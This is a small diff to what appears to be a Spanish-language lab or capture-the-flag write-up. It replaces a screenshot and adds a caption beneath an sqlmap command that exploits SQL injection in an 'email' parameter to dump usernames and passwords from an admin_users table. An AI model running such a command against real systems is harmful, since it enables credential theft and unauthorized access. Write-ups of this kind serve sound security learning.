@@ -62,4 +62,5 @@ sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin
 ```python
 sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --threads 10
 ```
-![[Pasted image 20240418101705.png]]
+con este comando logra
+![[Pasted image 20240418104412.png]]
